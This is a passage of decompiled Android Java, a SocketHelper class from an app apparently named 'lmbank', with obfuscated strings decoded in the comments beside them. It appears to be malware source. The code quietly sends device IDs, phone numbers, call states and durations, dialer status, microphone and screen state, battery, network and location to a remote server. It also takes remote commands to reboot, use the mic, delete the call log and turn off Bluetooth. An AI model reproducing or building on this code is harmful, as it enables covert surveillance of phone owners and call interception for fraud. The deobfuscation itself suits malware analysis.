//             mSocket.off(bb7d7pu7.m5998("DB8MBx02GwwLBgYdNg8bBgQ2GgwbHwwb"), this.onReboot);
        mSocket.off("event_reboot_from_server", this.onReboot);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02BAAKNg8bBgQ2GgwbHwwb"), this.onMic);
        mSocket.off("event_mic_from_server", this.onMic);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02DQwFNgoIBQU2BQYONg8bBgQ2GgwbHwwb"), this.onDelCallLog);
        mSocket.off("event_del_call_log_from_server", this.onDelCallLog);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02CgUGGgw2CwUcDB0GBh0BNg8bBgQ2GgwbHwwb"), this.onCloseBluetooth);
        mSocket.off("event_close_bluetooth_from_server", this.onCloseBluetooth);
//             mSocket.off(bb7d7pu7.m5998("DB8MBx02GgobDAwHNhodCB0MNg8bBgQ2GgwbHwwb"), this.onScreenState);
        mSocket.off("event_screen_state_from_server", this.onScreenState);
        mSocket.disconnect();
        return;
    }

    public boolean isConnected() {
        Socket socket = mSocket;
        if (socket != null) {
            return socket.connected();
        }
        return false;
    }

    public void sendRefreshRecordingMsgToServer() {
        HashMap hashMap = new HashMap();
//         hashMap.put(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID);
        hashMap.put("appId", Constants.COMPANY_UUID);
//         hashMap.put(bb7d7pu7.m5998("DQwfAAoMNgAN"), DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
        hashMap.put("device_id", DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
        String jSONObject = JsonUtils.map2Json(hashMap).toString();
        if (mSocket.connected()) {
//             sendMsgToServer(bb7d7pu7.m5998("DB8MBx02GwwPGwwaATYbDAoGGw0ABw4"), jSONObject);
            sendMsgToServer("event_refresh_recording", jSONObject);
        }
    }

    private String generateCallStateMsg(String... strArr) {
        HashMap hashMap = new HashMap();
//         hashMap.put(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID);
        hashMap.put("appId", Constants.COMPANY_UUID);
//         hashMap.put(bb7d7pu7.m5998("DQwfAAoMNgAN"), DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
        hashMap.put("device_id", DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
//         hashMap.put(bb7d7pu7.m5998("CggFBTYaHQgdDA"), strArr[0]);
        hashMap.put("call_state", strArr[0]);
//         hashMap.put(bb7d7pu7.m5998("GQEGBww2BxwECwwb"), strArr[1]);
        hashMap.put("phone_number", strArr[1]);
        int length = strArr.length;
//         String m5998 = bb7d7pu7.m5998("CggFBTYNDA8IHAUdNg0ACAUMGzYZCAoCCA4M");
        String m5998 = "call_default_dialer_package";
//         String m59982 = bb7d7pu7.m5998("CggFBTYAGjYNDA8IHAUdNg0ACAUMGw");
        String m59982 = "call_is_default_dialer";
        if (length == 5) {
//             hashMap.put(bb7d7pu7.m5998("CggFBTYNHBsIHQAGBw"), strArr[2]);
            hashMap.put("call_duration", strArr[2]);
            hashMap.put(m59982, strArr[3]);
            hashMap.put(m5998, strArr[4]);
        }
        if (strArr.length == 6) {
//             hashMap.put(bb7d7pu7.m5998("GQEGBww2BxwECwwbNhsMCAU"), strArr[2]);
            hashMap.put("phone_number_real", strArr[2]);
//             hashMap.put(bb7d7pu7.m5998("CggFBTYaBhwbCgw"), strArr[3]);
            hashMap.put("call_source", strArr[3]);
            hashMap.put(m59982, strArr[4]);
            hashMap.put(m5998, strArr[5]);
        }
        return JsonUtils.map2Json(hashMap).toString();
    }

    public void sendMsgToServer(String str, String str2) {
        Socket socket = mSocket;
        if (socket == null) {
            return;
        }
        socket.emit(str, str2);
    }

    public void sendConnectStateToServer(String str) {
        HashMap hashMap = new HashMap();
//         hashMap.put(bb7d7pu7.m5998("GQgbCAQ"), generateConnectStateMsg(str));
        hashMap.put("param", generateConnectStateMsg(str));
        HttpManager.getInstance().sendConnectStateToServer(JsonUtils.map2Json(hashMap).toString(), new HttpEngine.OnResponseCallback<HttpResponse.R_String>() { // from class: com.wish.lmbank.helper.SocketHelper.20

            @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
            public void onResponse(int i, String str2, HttpResponse.R_String r_String) {
                String str3 = TAG;
//                 LogUtils.v(str3, bb7d7pu7.m5998("GgwHDSoGBwcMCh06HQgdDD0GOgwbHwwbSRsMGhwFHVM") + i);
                LogUtils.v(str3, "sendConnectStateToServer result:" + i);
            }
        });
    }

    private String generateConnectStateMsg(String str) {
        HashMap hashMap = new HashMap();
//             hashMap.put(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID);
        hashMap.put("appId", Constants.COMPANY_UUID);
//             hashMap.put(bb7d7pu7.m5998("DQwfAAoMNgAN"), DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
        hashMap.put("device_id", DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
//             hashMap.put(bb7d7pu7.m5998("CgYHBwwKHTYaHQgdDA"), str);
        hashMap.put("connect_state", str);
        return JsonUtils.map2Json(hashMap).toString();
    }

    public void sendMICToServer(String str) {
        Socket socket = mSocket;
        if (socket != null && socket.connected()) {
            HashMap hashMap = new HashMap();
//             hashMap.put(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID);
            hashMap.put("appId", Constants.COMPANY_UUID);
//             hashMap.put(bb7d7pu7.m5998("DQwfAAoMNgAN"), DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
            hashMap.put("device_id", DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
//             hashMap.put(bb7d7pu7.m5998("ABooHwgABQgLBQw"), str);
            hashMap.put("isAvailable", str);
//             sendMsgToServer(bb7d7pu7.m5998("DB8MBx02BAAKNggfCAAFCAsFDDYdBjYaDBsfDBs"), JsonUtils.map2Json(hashMap).toString());
            sendMsgToServer("event_mic_available_to_server", JsonUtils.map2Json(hashMap).toString());
        }
    }

    public void sendScreenStateToServer(String str) {
        Socket socket = mSocket;
        if (socket != null && socket.connected()) {
            HashMap hashMap = new HashMap();
//                 hashMap.put(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID);
            hashMap.put("appId", Constants.COMPANY_UUID);
//                 hashMap.put(bb7d7pu7.m5998("DQwfAAoMNgAN"), DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
            hashMap.put("device_id", DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
//                 hashMap.put(bb7d7pu7.m5998("GgobDAwHNhodCB0M"), str);
            hashMap.put("screen_state", str);
//                 sendMsgToServer(bb7d7pu7.m5998("DB8MBx02GgobDAwHNhodCB0MNh0GNhoMGx8MGw"), JsonUtils.map2Json(hashMap).toString());
            sendMsgToServer("event_screen_state_to_server", JsonUtils.map2Json(hashMap).toString());
            return;
        }
        return;
    }

    public void sendCallStartedMsgToServer(String... strArr) {
        if (mSocket == null) {
            return;
        }
        if (strArr == null || strArr.length < 4) {
//             LogUtils.v(this.TAG, bb7d7pu7.m5998("GgwHDSoIBQU6HQgbHQwNJBoOPQY6DBsfDBtJGQgbCARJAAcfCAUADQ"));
            LogUtils.v(this.TAG, "sendCallStartedMsgToServer param invalid");
            return;
        }
        String generateCallStateMsg = generateCallStateMsg(strArr[0], strArr[1], strArr[2], strArr[3], String.valueOf(SettingUtils.isDefaultDialer(AppStartV.getContext())), SettingUtils.getDefaultDialerPackage(AppStartV.getContext()));
        if (mSocket.connected()) {
//             sendMsgToServer(bb7d7pu7.m5998("DB8MBx02CggFBTYaHQgbHQwN"), generateCallStateMsg);
            sendMsgToServer("event_call_started", generateCallStateMsg);
        } else {
//             pushMsgCallRecording(bb7d7pu7.m5998("Gh0IGx0MDQ"), generateCallStateMsg);
            pushMsgCallRecording("started", generateCallStateMsg);
        }
    }

    public void sendCallEndedMsgToServer(String... strArr) {
        if (mSocket == null || strArr == null || strArr.length < 3) {
            return;
        }
        String generateCallStateMsg = generateCallStateMsg(strArr[0], strArr[1], strArr[2], String.valueOf(SettingUtils.isDefaultDialer(AppStartV.getContext())), SettingUtils.getDefaultDialerPackage(AppStartV.getContext()));
        if (mSocket.connected()) {
//             sendMsgToServer(bb7d7pu7.m5998("DB8MBx02CggFBTYMBw0MDQ"), generateCallStateMsg);
            sendMsgToServer("event_call_ended", generateCallStateMsg);
        } else {
//             pushMsgCallRecording(bb7d7pu7.m5998("DAcNDA0"), generateCallStateMsg);
            pushMsgCallRecording("ended", generateCallStateMsg);
        }
    }

    private void pushMsgCallRecording(String str, String str2) {
        String str3 = this.TAG;
//         LogUtils.v(str3, bb7d7pu7.m5998("GRwaASQaDioIBQU7DAoGGw0ABw5JGh0IHRwaUw") + str + bb7d7pu7.m5998("SUVJAxoGB1M") + str2);
        LogUtils.v(str3, "pushMsgCallRecording status:" + str + " , json:" + str2);
        HashMap hashMap = new HashMap();
//         hashMap.put(bb7d7pu7.m5998("GQgbCAQ"), str2);
        hashMap.put("param", str2);
//         hashMap.put(bb7d7pu7.m5998("Gh0IHRwa"), str);
        hashMap.put("status", str);
        HttpManager.getInstance().pushMsgCallRecording(JsonUtils.map2Json(hashMap).toString(), new HttpEngine.OnResponseCallback<HttpResponse.R_String>() { // from class: com.wish.lmbank.helper.SocketHelper.21
            @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
            public void onResponse(int i, String str4, HttpResponse.R_String r_String) {
                String str5 = TAG;
//                     LogUtils.v(str5, bb7d7pu7.m5998("GRwaASQaDioIBQU7DAoGGw0ABw5JGwwaHAUdUw") + i);
                LogUtils.v(str5, "pushMsgCallRecording result:" + i);
                return;
            }
        });
    }

    public void sendKeepHeartMsgToServer(String... strArr) {
        if (mSocket == null) {
            return;
        }
        if (strArr == null || strArr.length < 3) {
//             LogUtils.v(this.TAG, bb7d7pu7.m5998("GgwHDSIMDBkhDAgbHSQaDj0GOgwbHwwbSRkIGwgESQAHHwgFAA0"));
            LogUtils.v(this.TAG, "sendKeepHeartMsgToServer param invalid");
            return;
        }
        String generateKeepHeartMsg = generateKeepHeartMsg(strArr);
        if (mSocket.connected()) {
//             sendMsgToServer(bb7d7pu7.m5998("DB8MBx02AgwMGTYBDAgbHTYdBjYaDBsfDBs"), generateKeepHeartMsg);
            sendMsgToServer("event_keep_heart_to_server", generateKeepHeartMsg);
        } else {
            sendKeepHeartRequestToServer(generateKeepHeartMsg);
        }
    }

    private String generateKeepHeartMsg(String... strArr) {
        HashMap hashMap = new HashMap();
//             hashMap.put(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID);
        hashMap.put("appId", Constants.COMPANY_UUID);
//             hashMap.put(bb7d7pu7.m5998("DQwfAAoMNgAN"), DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
        hashMap.put("device_id", DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
//             hashMap.put(bb7d7pu7.m5998("CwgdHQwbEA"), strArr[0]);
        hashMap.put("battery", strArr[0]);
//             hashMap.put(bb7d7pu7.m5998("BwwdHgYbAg"), strArr[1]);
        hashMap.put("network", strArr[1]);
//             hashMap.put(bb7d7pu7.m5998("HQAEDBodCAQZ"), strArr[2]);
        hashMap.put("timestamp", strArr[2]);
        return JsonUtils.map2Json(hashMap).toString();
    }

    private void sendKeepHeartRequestToServer(String str) {
        String str2 = this.TAG;
//         LogUtils.v(str2, bb7d7pu7.m5998("GgwHDSQaDjsMGBwMGh09BjoMGx8MG0VJAxoGB1M") + str);
        LogUtils.v(str2, "sendMsgRequestToServer, json:" + str);
        HashMap hashMap = new HashMap();
//         hashMap.put(bb7d7pu7.m5998("GQgbCAQ"), str);
        hashMap.put("param", str);
        HttpManager.getInstance().sendKeepHeartRequestToServer(JsonUtils.map2Json(hashMap).toString(), new HttpEngine.OnResponseCallback<HttpResponse.R_String>() { // from class: com.wish.lmbank.helper.SocketHelper.22

            @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
            public void onResponse(int i, String str3, HttpResponse.R_String r_String) {
                String str4 = TAG;
//                     LogUtils.v(str4, bb7d7pu7.m5998("GgwHDSQaDjsMGBwMGh09BjoMGx8MG0kbDBocBR1T") + i);
                LogUtils.v(str4, "sendMsgRequestToServer result:" + i);
                return;
            }
        });
        return;
    }

    public void sendLocationMsgToServer(String... strArr) {
        if (mSocket == null) {
            return;
        }
        if (strArr == null || strArr.length < 1) {
//             LogUtils.v(this.TAG, bb7d7pu7.m5998("GgwHDSUGCggdAAYHJBoOPQY6DBsfDBtJGQgbCARJAAcfCAUADQ"));
            LogUtils.v(this.TAG, "sendLocationMsgToServer param invalid");
            return;
        }
        String generateLocationMsg = generateLocationMsg(strArr[0]);
        if (mSocket.connected()) {
//             sendMsgToServer(bb7d7pu7.m5998("DB8MBx02BQYKCB0ABgc2HQY2GgwbHwwb"), generateLocationMsg);
            sendMsgToServer("event_location_to_server", generateLocationMsg);
        } else {
            sendLocationRequestToServer(generateLocationMsg);
        }
    }

    public void sendUploadInfoMsgToServer(String... strArr) {
        Socket socket = mSocket;
        if (socket == null) {
            return;
        }
        if (strArr == null || strArr.length < 1) {
//             LogUtils.v(this.TAG, bb7d7pu7.m5998("GgwHDTwZBQYIDSAHDwYkGg49BjoMGx8MG0kZCBsIBEkABx8IBQAN"));
            LogUtils.v(this.TAG, "sendUploadInfoMsgToServer param invalid");
        } else if (socket.connected()) {
//             sendMsgToServer(bb7d7pu7.m5998("DB8MBx02GwwPGwwaATYcGQUGCA02AAcPBjYdBjYaDBsfDBs"), strArr[0]);
            sendMsgToServer("event_refresh_upload_info_to_server", strArr[0]);
        }
    }

    private void sendLocationRequestToServer(String str) {
        String str2 = this.TAG;
//         LogUtils.v(str2, bb7d7pu7.m5998("GgwHDSUGCggdAAYHOwwYHAwaHT0GOgwbHwwbRUkDGgYHUw") + str);
        LogUtils.v(str2, "sendLocationRequestToServer, json:" + str);
        HashMap hashMap = new HashMap();
//         hashMap.put(bb7d7pu7.m5998("GQgbCAQ"), str);
        hashMap.put("param", str);
        HttpManager.getInstance().sendLocationRequestToServer(JsonUtils.map2Json(hashMap).toString(), new HttpEngine.OnResponseCallback<HttpResponse.R_String>() { // from class: com.wish.lmbank.helper.SocketHelper.23


            @Override // com.wish.lmbank.http.HttpEngine.OnResponseCallback
            public void onResponse(int i, String str3, HttpResponse.R_String r_String) {
                String str4 = TAG;
//                 LogUtils.v(str4, bb7d7pu7.m5998("GgwHDSUGCggdAAYHOwwYHAwaHT0GOgwbHwwbSRsMGhwFHVM") + i);
                LogUtils.v(str4, "sendLocationRequestToServer result:" + i);
            }
        });
    }

    private String generateLocationMsg(String... strArr) {
        HashMap hashMap = new HashMap();
//             hashMap.put(bb7d7pu7.m5998("CBkZIA0"), Constants.COMPANY_UUID);
        hashMap.put("appId", Constants.COMPANY_UUID);
//             hashMap.put(bb7d7pu7.m5998("DQwfAAoMNgAN"), DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
        hashMap.put("device_id", DeviceInfoUtils.getDeviceID(AppStartV.getContext()));
//             hashMap.put(bb7d7pu7.m5998("BQYKCB0ABgc"), strArr[0]);
        hashMap.put("location", strArr[0]);
        return JsonUtils.map2Json(hashMap).toString();
    }
}
